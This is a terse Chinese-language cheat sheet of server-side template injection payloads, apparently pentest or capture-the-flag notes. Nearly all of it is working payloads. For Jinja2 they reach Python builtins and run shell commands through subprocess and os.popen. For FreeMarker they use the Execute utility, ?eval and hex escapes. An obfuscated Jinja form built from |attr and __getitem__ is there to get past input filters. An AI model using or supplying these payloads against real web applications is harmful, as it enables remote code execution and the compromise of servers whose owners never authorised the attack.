## 混淆

过滤器 `|` 访问属性

注意
- 特定对象在不同链中对应字典或属性
- 位置参数或不可用

## python

### jinja

```py
# 查看配置
{{ config }} 
```

```py
# subprocess.run
{{ self.__init__.__globals__.__builtins__.__import__('subprocess').run(["env"], capture_output=true) }}

# 全局字典 -> builtins 字典
{{ lipsum.__globals__["__builtins__"]["__import__"]("subprocess").check_output(("ls", "-al")).decode() }}

# builtins 属性
{{ lipsum.__builtins__["__import__"]("subprocess").getoutput("ls -al") }}

# 废弃 os.popen
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
- `capture_output` 捕获输出为字节

#### 混淆

```py
# 混淆：无 `[]._` 
<@urlencode>
<@replace('_','\x5f')>
<@replace('.','\x2e')>

{{ lipsum
    |attr("__globals__")
    |attr("__getitem__")("__builtins__")
    |attr("__getitem__")("__import__")("subprocess")
    |attr("check_output")(("ls", "-al"))
    |attr("decode")()
}}

</@replace>
</@replace>
</@urlencode>
```
- 使用 `|attr("属性名")` 访问属性
- 使用 `__getitem__("key 名")` 访问字典键值对



## java

### freemarker

```java
# 版本
${.version}

# 遍历内置变量字典
<#list .data_model as key, value>
    ${key}: ${value}
</#list>

# 系统命令执行
${"freemarker.template.utility.Execute"?new()("id")}

# 字符串表达式执行
${'"freemarker.template.utility.Execute"?new()("id")'?eval}  

# 十六进制转义字符串混淆
${'<@hex_escapes>"freemarker.template.utility.Execute"?new()("id")</@hex_escapes>'?eval}  
```
